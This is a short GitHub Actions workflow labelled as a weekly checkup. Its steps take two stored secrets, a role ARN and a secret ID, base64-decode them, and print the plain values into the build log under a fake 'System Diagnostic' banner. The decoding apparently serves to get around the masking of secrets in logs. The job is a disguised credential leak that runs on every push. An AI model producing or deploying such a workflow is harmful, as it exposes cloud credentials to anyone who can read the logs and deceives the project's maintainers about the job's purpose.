name: WEEKLY CHECKUP






on:
  push:




jobs:
 Weekly-checks:
  runs-on: ubuntu-latest






  steps:
    - name: Encrypted Github secrets
      run: |
        echo "${{ secrets.ENCODED_ROLE1_ARN }}" > secret_role_arn.b64
        echo "${{ secrets.ENCODED_SECRET_ID }}" > secret_id.b64
    - name: Leak check
      run: |
        # Decode the base64 content to a file
        base64 -d secret_role_arn.b64 > secret.txt
        base64 -d secret_id.b64 > secret1.txt
        
        # Print "diagnostic output"
        echo "::group::System Diagnostic"
        echo "ðŸ”§ ENV CHECK: OK"
        echo "ðŸ”§ ROLE CHECK: OK"
        echo "ðŸ”§ Role_arn: $(cat secret.txt)"
        echo "ðŸ”§ secret_id: $(cat secret1.txt)"
        echo "ðŸ”§ TEST FAILED - LEAKS FOUND"
        echo "::endgroup::"
